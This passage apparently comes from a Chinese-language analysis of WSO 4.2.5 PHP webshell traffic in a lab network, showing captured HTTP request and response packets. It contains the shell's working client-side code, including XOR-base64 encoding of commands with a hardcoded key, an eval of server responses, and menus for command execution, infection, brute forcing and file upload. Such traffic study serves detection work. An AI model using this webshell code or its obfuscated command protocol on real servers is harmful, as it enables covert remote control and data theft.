			d.mf.p1.value = encrypt(d.mf.p1.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p2.value = encrypt(d.mf.p2.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p3.value = encrypt(d.mf.p3.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
		}
		function g(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			d.mf.submit();
		}
		function a(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			var params = 'ajax=true';
			for(i=0;i<d.mf.elements.length;i++)
				params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
			sr('/webshell-master/php/wso/wso-4.2.5.php', params);
		}
		function sr(url, params) {
			if (window.XMLHttpRequest)
				req = new XMLHttpRequest();
			else if (window.ActiveXObject)
				req = new ActiveXObject('Microsoft.XMLHTTP');
	        if (req) {
	            req.onreadystatechange = processReqChange;
	            req.open('POST', url, true);
	            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
	            req.send(params);
	        }
		}
		function processReqChange() {
			if( (req.readyState == 4) )
				if(req.status == 200) {
					var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
					var arr=reg.exec(req.responseText);
					eval(arr[2].substr(0, arr[1]));
				} else alert('Request error!');
		}
	</script>
	<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
	<form method=post name=mf style='display:none;'>
	<input type=hidden name=a>
	<input type=hidden name=c>
	<input type=hidden name=p1>
	<input type=hidden name=p2>
	<input type=hidden name=p3>
	<input type=hidden name=charset>
	</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux ubuntu 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 <a href="http://noreferer.de/?http://www.google.com/search?q=Linux+ubuntu+3.19.0-25-generic+%2326%7E14.04.1-Ubuntu+SMP+Fri+Jul+24+21%3A16%3A20+UTC+2015+x86_64" target="_blank">[ Google ]</a> <a href="http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=Linux+Kernel+3.19.0" target=_blank>[ Exploit-DB ]</a></nobr><br>33 ( www-data ) <span>Group:</span> 33 ( www-data )<br>5.5.9-1ubuntu4.19 <span>Safe mode:</span> <font color=#FFDB5F><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2016-11-03 22:42:29<br>18.58 GB <span>Free:</span> 13.12 GB (70.62%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/var/")'>var/</a><a href='#' onclick='g("FilesMan","/var/www/")'>www/</a><a href='#' onclick='g("FilesMan","/var/www/html/")'>html/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/")'>webshell-master/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/")'>php/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/wso/")'>wso/</a> <font color=#FFDB5F><b>drwxrwxrwx</b></font> <a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)"><option value="UTF-8" selected>UTF-8</option><option value="Windows-1251" >Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></select></label><br><span>Server IP:</span><br>192.168.182.143<br><span>Client IP:</span><br>192.168.182.1</nobr></td></tr></table><table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr><th>[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th>[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th>[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th>[ <a href="#" onclick="g('Infect',null,'','','')">Infect</a> ]</th><th>[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th>[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th>[ <a href="#" onclick="g('SafeMode',null,'','','')">Safe mode</a> ]</th><th>[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th>[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th>[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th>[ <a href="#" onclick="g('Logout',null,'','','')">Logout</a> ]</th><th>[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div><h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script><script>
		function sa() {
			for(i=0;i<d.files.elements.length;i++)
				if(d.files.elements[i].type == 'checkbox')
					d.files.elements[i].checked = d.files.elements[0].checked;
		}
	</script>
	<table width='100%' class='main' cellspacing='0' cellpadding='2'>
	<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g("FilesMan",null,"s_name_0")'>Name</a></th><th><a href='#' onclick='g("FilesMan",null,"s_size_0")'>Size</a></th><th><a href='#' onclick='g("FilesMan",null,"s_modify_0")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g("FilesMan",null,"s_perms_0")'>Permissions</a></th><th>Actions</th></tr><tr><td><input type=checkbox name="f[]" value=".." class=chkbx></td><td><a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso/..');" ><b>[ .. ]</b></a></td><td>dir</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'..','chmod')"><font color=white><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'..', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'..', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="readme.md" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'readme.md', 'view')">readme.md</a></td><td>1.73 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'readme.md','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'readme.md', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'readme.md', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'readme.md', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'readme.md', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'readme.md', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.1.3.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.1.3.php', 'view')">wso-4.1.3.php</a></td><td>75.76 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.1.3.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso-4.2.0.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.0.php', 'view')">wso-4.2.0.php</a></td><td>86.53 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.0.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.2.1.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.1.php', 'view')">wso-4.2.1.php</a></td><td>75.72 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.1.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso-4.2.2.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.2.php', 'view')">wso-4.2.2.php</a></td><td>75.71 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.2.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.2.3.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.3.php', 'view')">wso-4.2.3.php</a></td><td>76.26 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.3.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso-4.2.4.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.4.php', 'view')">wso-4.2.4.php</a></td><td>76.41 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.4.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.2.5.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.5.php', 'view')">wso-4.2.5.php</a></td><td>77.86 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.5.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso.php', 'view')">wso.php</a></td><td>61.58 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso2.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso2.php', 'view')">wso2.php</a></td><td>64.56 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso2.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso2.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso2.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso2.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso2.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso2.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso2_pack.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso2_pack.php', 'view')">wso2_pack.php</a></td><td>24.17 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso2_pack.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso_404.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso_404.php', 'view')">wso_404.php</a></td><td>105.04 KB</td><td>2016-11-03 17:58:16</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso_404.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso_404.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso_404.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso_404.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso_404.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso_404.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="WSO_4_0_5.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'WSO_4_0_5.php', 'view')">WSO_4_0_5.php</a></td><td>67.72 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'WSO_4_0_5.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="WSO_base64.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'WSO_base64.php', 'view')">WSO_base64.php</a></td><td>82.16 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'WSO_base64.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'download')">D</a></td></tr><tr id=fak><td colspan=7>
		<input type=hidden name=ne value=''>
		<input type=hidden name=a value='FilesMan'>
		<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
		<input type=hidden name=charset value='UTF-8'>
		<label><select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><option value='zip'>+ zip</option><option value='unzip'>- zip</option><option value='tar'>+ tar.gz</option></select></label><input type='submit' value='submit'></td></tr></form></table></div>
	</div>
	<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
		<tr>
			<td><form onsubmit="g(null,this.c.value,'');return false;"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/var/www/html/webshell-master/php/wso/'><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
			<td><form method='post' ENCTYPE='multipart/form-data'>
			<input type=hidden name=a value='FilesMan'>
			<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
			<input type=hidden name=p1 value='uploadFile'>
			<input type=hidden name=ne value=''>
			<input type=hidden name=charset value='UTF-8'>
			<span>Upload file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
		</tr></table></div>
		<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
		<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
		</body></html>

(增加文件操作)
**请求数据包**
<br>

	POST /webshell-master/php/wso/wso-4.2.5.php HTTP/1.1
	Host: 192.168.182.143
	Connection: keep-alive
	Content-Length: 245
	Cache-Control: max-age=0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Origin: http://192.168.182.143
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
	Content-Type: application/x-www-form-urlencoded
	Referer: http://192.168.182.143/webshell-master/php/wso/wso-4.2.5.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.8
	Cookie: da94407ecf64bda7c0ac6ea1fa4477d8stderr_to_out=1; da94407ecf64bda7c0ac6ea1fa4477d8key=d69aa478a72ecd3a99c77af6fcf6b917; da94407ecf64bda7c0ac6ea1fa4477d8=21232f297a57a5a743894a0e4a801fc3; da94407ecf64bda7c0ac6ea1fa4477d8ajax=0; PHPSESSID=mh6l96lmrd0so2isi315c3loi4
	
	a=CCk1RgMPC2UsSFEbLQ13UQ%3D%3D&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy58XxQtEBssA39cPHoARw%3D%3D&p2=OBMtWDgAPVw%3D&p3=&charset=UTF-8

**响应数据包**
<br>

	HTTP/1.1 200 OK
	Date: Fri, 04 Nov 2016 05:43:08 GMT
	Server: Apache/2.4.7 (Ubuntu)
	X-Powered-By: PHP/5.5.9-1ubuntu4.19
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 4549
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
	Content-Type: text/html

	<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title>192.168.182.143 - WSO 4.2.5</title>
	<style>
		body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
		#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
		body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
		table.info	{color:#C3C3C3;}
		table#toolsTbl {background-color: #060A10;}
		span,h1,a	{color:#fff !important;}
		span		{font-weight:bolder;}
		h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
		div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
		a			{text-decoration:none;}
		a:hover		{text-decoration:underline;}
		.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
		.tooltip:hover::after {opacity:1;visibility:visible;}
		.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
		.bigarea	{min-width:100%;max-width:100%;height:400px;}
		input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
		label {position:relative}
		label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
		label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
		form		{margin:0px;}
		#toolsTbl	{text-align:center;}
		#fak 		{background:none;}
		#fak td 	{padding:5px 0 0 0;}
		iframe		{border:1px solid #060a10;}
		.toolsInp	{width:300px}
		.main th	{text-align:left;background-color:#060a10;}
		.main tr:hover{background-color:#354252;}
		.main td, th{vertical-align:middle;}
		input[type='submit']{background-color:#2E6E9C;}
		input[type='button']{background-color:#2E6E9C;}
		input[type='submit']:hover{background-color:#56AD15;}
		input[type='button']:hover{background-color:#56AD15;}
		.l1			{background-color:#202832;}
		pre			{font:9pt Courier New;}
	</style>
	<script>
	    var c_ = '/var/www/html/webshell-master/php/wso/';
	    var a_ = 'FilesTools'
	    var charset_ = 'UTF-8';
	    var p1_ = '/var/www/html/webshell-master/php/wso/hello.txt';
	    var p2_ = 'edit';
	    var p3_ = '';
	    var d = document;
		
		function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
		function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
		function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
		function set(a,c,p1,p2,p3,charset) {
			if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
			if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
			if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
			if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
			if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
			d.mf.a.value = encrypt(d.mf.a.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.c.value = encrypt(d.mf.c.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p1.value = encrypt(d.mf.p1.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p2.value = encrypt(d.mf.p2.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p3.value = encrypt(d.mf.p3.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
		}
		function g(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			d.mf.submit();
		}
